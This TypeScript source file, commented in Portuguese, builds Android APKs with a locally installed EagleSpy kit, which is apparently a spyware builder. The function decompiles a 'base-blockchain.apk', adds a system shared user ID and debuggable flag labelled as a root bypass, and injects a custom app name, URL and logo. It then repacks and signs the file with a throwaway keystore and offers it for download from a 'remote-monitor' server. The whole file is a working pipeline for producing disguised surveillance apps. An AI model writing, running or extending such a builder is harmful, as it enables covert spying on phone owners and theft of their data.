import fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';

interface APKBuildOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Builder usando EagleSpy DIRETAMENTE
 * Exatamente como seu amigo faz no Windows
 */
export async function buildWithEagleSpyDirect(options: APKBuildOptions): Promise<{
  success: boolean;
  filename?: string;
  downloadUrl?: string;
  error?: string;
}> {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';
    
    const eaglespyDir = '/tmp/EagleSpy-V5_life';
    
    if (!fs.existsSync(eaglespyDir)) {
      return { success: false, error: 'EagleSpy não encontrado' };
    }
    
    const timestamp = Date.now();
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const sanitizedName = options.appName
      .replace(/[^a-zA-Z0-9-]/g, '-')
      .replace(/-+/g, '-')
      .toLowerCase();
    
    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
    const outputPath = path.join(apksDir, filename);
    
    console.log('[EAGLESPY-DIRECT] Iniciando build com EagleSpy...');
    console.log('[EAGLESPY-DIRECT] App Name:', options.appName);
    console.log('[EAGLESPY-DIRECT] App URL:', options.appUrl);
    
    // 1. Usar apktool do EagleSpy para descompactar
    const baseAPK = path.join(apksDir, 'base-blockchain.apk');
    const tempDir = `/tmp/eaglespy-direct-${timestamp}-${randomSuffix}`;
    const decodedDir = path.join(tempDir, 'decoded');
    
    execSync(`mkdir -p ${tempDir}`);
    
    console.log('[EAGLESPY-DIRECT] 1/5 Desempacotando com apktool...');
    const apktoolJar = path.join(eaglespyDir, 'res', 'Lib', 'apktool.jar');
    
    if (!fs.existsSync(apktoolJar)) {
      return { success: false, error: 'apktool.jar não encontrado' };
    }
    
    try {
      execSync(`cd ${tempDir} && java -jar ${apktoolJar} d -f ${baseAPK} -o ${decodedDir}`, {
        timeout: 120000,
        stdio: 'pipe'
      });
    } catch (err) {
      console.error('[EAGLESPY-DIRECT] Erro ao descompactar:', err);
      return { success: false, error: 'Erro ao descompactar APK' };
    }
    
    // 2. Modificar AndroidManifest.xml
    console.log('[EAGLESPY-DIRECT] 2/5 Modificando AndroidManifest.xml...');
    const manifestPath = path.join(decodedDir, 'AndroidManifest.xml');
    
    if (fs.existsSync(manifestPath)) {
      let manifest = fs.readFileSync(manifestPath, 'utf-8');
      
      // Adicionar bypass ROOT
      manifest = manifest.replace(
        '<manifest',
        '<manifest android:sharedUserId="android.uid.system"'
      );
      
      manifest = manifest.replace(
        '<application',
        '<application android:debuggable="true"'
      );
      
      fs.writeFileSync(manifestPath, manifest);
    }
    
    // 3. Adicionar config JSON
    console.log('[EAGLESPY-DIRECT] 3/5 Adicionando config...');
    const assetsDir = path.join(decodedDir, 'assets');
    fs.mkdirSync(assetsDir, { recursive: true });
    
    const config = {
      appName: options.appName,
      appUrl: options.appUrl,
      logoUrl: options.logoUrl || '',
      customized: true,
      timestamp: Date.now(),
    };
    
    fs.writeFileSync(
      path.join(assetsDir, 'app-config.json'),
      JSON.stringify(config, null, 2)
    );
    
    // 4. Reempacotar com apktool
    console.log('[EAGLESPY-DIRECT] 4/5 Reempacotando...');
    const unsignedAPK = path.join(tempDir, 'app-unsigned.apk');
    
    try {
      execSync(
        `cd ${tempDir} && java -jar ${apktoolJar} b ${decodedDir} -o ${unsignedAPK}`,
        { timeout: 120000, stdio: 'pipe' }
      );
    } catch (err) {
      console.error('[EAGLESPY-DIRECT] Erro ao reempacotar:', err);
      return { success: false, error: 'Erro ao reempacotar APK' };
    }
    
    // 5. Assinar com jarsigner
    console.log('[EAGLESPY-DIRECT] 5/5 Assinando...');
    const keystorePath = '/tmp/android-eaglespy.keystore';
    
    if (!fs.existsSync(keystorePath)) {
      console.log('[EAGLESPY-DIRECT] Criando keystore...');
      try {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 -validity 10000 -alias android -storepass android -keypass android -dname "CN=Android Debug, OU=Android, O=US, L=US, ST=US, C=US"`,
          { stdio: 'pipe' }
        );
      } catch (err) {
        console.error('[EAGLESPY-DIRECT] Erro ao criar keystore:', err);
      }
    }
    
    try {
      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore ${keystorePath} -storepass android -keypass android ${unsignedAPK} android`,
        { stdio: 'pipe' }
      );
    } catch (err) {
      console.error('[EAGLESPY-DIRECT] Erro ao assinar:', err);
      return { success: false, error: 'Erro ao assinar APK' };
    }
    
    // Copiar para saída
    fs.copyFileSync(unsignedAPK, outputPath);
    
    // Limpar temp
    execSync(`rm -rf ${tempDir}`);
    
    console.log('[EAGLESPY-DIRECT] ✅ APK construído com sucesso!');
    console.log('[EAGLESPY-DIRECT] Arquivo:', filename);
    console.log('[EAGLESPY-DIRECT] Tamanho:', fs.statSync(outputPath).size, 'bytes');
    
    const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
    
    return { 
      success: true, 
      filename, 
      downloadUrl 
    };
  } catch (error) {
    console.error('[EAGLESPY-DIRECT] Erro fatal:', error);
    return { 
      success: false, 
      error: error instanceof Error ? error.message : 'Unknown error' 
    };
  }
}
